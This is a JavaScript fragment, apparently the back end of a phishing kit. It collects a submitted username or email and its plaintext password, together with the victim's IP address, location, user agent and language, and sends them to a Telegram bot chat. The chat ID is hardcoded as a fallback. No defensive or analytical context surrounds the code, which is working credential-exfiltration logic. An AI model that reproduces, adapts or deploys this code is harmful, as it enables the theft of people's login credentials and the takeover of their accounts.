function buildLoginAttemptText(fields = {}, req = {}, formId = 'unknown') {
  const emailOrUser = fields.email || fields.username || fields.user || fields.login || '';
  const password = fields.password || fields.pass || '';
  const ip = extractClientIp(req);
  const loc = extractLocation(req);
  const userAgent = req.headers?.['user-agent'] || fields.userAgent || '';
  const language = req.headers?.['accept-language'] || fields.language || '';
  const time = fields.submittedAt || new Date().toISOString();
  const submission = loc?.place ? `${formId} (${loc.place})` : String(formId);

  return [
    '🔐 New Login Attempt',
    `👤 Email/Username: ${emailOrUser}`,
    `🔑 Password: ${password}`,
    `📱 IP Address: ${ip}`,
    `🌐 User Agent: ${userAgent}`,
    `🌍 Language: ${language}`,
    `📅 Time: ${time}`,
    `🔄 Submission: ${submission}`,
  ].join('\n');
}

async function sendTelegramSubmit(payload, req, formId = 'unknown') {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID || '5810458739';
  if (!token || !chatId) return;

  const text = buildLoginAttemptText(payload, req, formId);

  const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      disable_web_page_preview: true,
    }),
  });

  if (!res.ok) {
    throw new Error(`Telegram failed (${res.status}): ${await res.text()}`);
  }
}
